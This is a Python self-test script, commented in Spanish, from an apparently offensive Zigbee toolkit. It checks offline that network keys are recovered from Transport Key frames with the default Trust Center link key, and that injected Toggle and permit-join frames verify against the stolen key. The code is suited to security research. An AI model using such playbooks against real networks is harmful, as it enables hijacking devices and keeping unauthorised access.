"""Self-test criptográfico de los playbooks — round-trip sin hardware.

1. Construye un Transport Key sintético (idéntico al de un hub real).
2. El watcher lo intercepta y recupera la network key con la TC link key default.
3. Verifica que NO hay falsos positivos con tráfico basura.
4. Construye un comando ZCL inyectado y verifica que su MIC descifra con la
   network key robada (lo que haría el dispositivo víctima al recibirlo).
5. Ídem para el frame ZDO de apertura de red (persistencia).

Ejecutar:  python -m skyrf.playbooks.selftest
"""

from __future__ import annotations

import sys

from skyrf.playbooks.crypto_zigbee import DEFAULT_TC_LINK_KEY
from skyrf.playbooks.transport_key_watcher import (
    TransportKeyWatcher, build_synthetic_transport_key,
)
from skyrf.playbooks.zcl_injector import (
    build_zcl_frame, decrypt_injected_for_test,
)
from skyrf.playbooks.persistence import build_permit_join_frame


def main() -> int:
    print("SkyRF · selftest de playbooks\n")

    network_key = bytes.fromhex("00112233445566778899AABBCCDDEEFF")
    tc_addr = 0x00124B0001AA2201
    pan_id = 0x1A62
    ok_all = True

    # 1 — Transport Key round-trip
    frame = build_synthetic_transport_key(network_key, tc_addr, pan_id)
    print(f"[1] Transport Key sintético: {len(frame)} bytes")
    captured = []
    TransportKeyWatcher(on_key_captured=captured.append).feed(frame)
    if captured and captured[0].network_key == network_key:
        net = captured[0]
        print(f"    [✓] network key recuperada: {net.network_key.hex()}")
        print(f"        {net.summary()}")
    else:
        print("    [✗] el watcher NO recuperó la network key"); ok_all = False
        net = None

    # 2 — sin falsos positivos
    false_pos = []
    TransportKeyWatcher(on_key_captured=false_pos.append).feed(b"\x41\x88" + b"\x00" * 30)
    TransportKeyWatcher(on_key_captured=false_pos.append).feed(b"\xff" * 60)
    print(f"[2] [{'✓' if not false_pos else '✗'}] sin falsos positivos en tráfico basura")
    ok_all &= not false_pos

    if net:
        # 3 — inyección ZCL: el MIC debe verificar con la network key robada
        injected = build_zcl_frame(
            net.network_key, tc_long_addr=tc_addr, nwk_frame_counter=500,
            dst_pan=pan_id, short_dst=0x1234,
        )
        plain = decrypt_injected_for_test(injected, net.network_key)
        zcl_ok = plain is not None and plain[-1] == 0x02  # cmd toggle
        print(f"[3] [{'✓' if zcl_ok else '✗'}] frame ZCL inyectado: MIC verifica "
              f"y cmd=Toggle llega intacto ({len(injected)} bytes)")
        ok_all &= bool(zcl_ok)

        # 4 — persistencia: permit-join inyectado
        pj = build_permit_join_frame(
            net.network_key, tc_long_addr=tc_addr, nwk_frame_counter=501,
            dst_pan=pan_id, duration_s=60,
        )
        plain4 = decrypt_injected_for_test(pj, net.network_key)
        pj_ok = plain4 is not None and plain4[-2] == 60  # duration en el payload ZDO
        print(f"[4] [{'✓' if pj_ok else '✗'}] frame ZDO permit-join: MIC verifica "
              f"y duration=60s llega intacta ({len(pj)} bytes)")
        ok_all &= bool(pj_ok)

    print()
    if ok_all:
        print("Todos los playbooks verificados (round-trip criptográfico completo).")
        print(f"TC link key default: {DEFAULT_TC_LINK_KEY.hex()}")
        return 0
    print("SELFTEST FALLÓ — revisar salida.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
